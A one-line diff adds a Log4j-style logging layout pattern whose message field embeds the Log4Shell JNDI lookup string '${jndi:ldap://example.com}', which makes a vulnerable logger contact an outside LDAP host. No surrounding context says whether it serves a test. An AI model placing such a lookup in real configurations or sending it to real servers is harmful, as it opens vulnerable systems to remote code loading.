@@ -1,0 +1,1 @@
+%d{yyyy-MM-dd HH:mm:ss,SSS} [%t] %-5p %c{1}:%L - ${jndi:ldap://example.com}
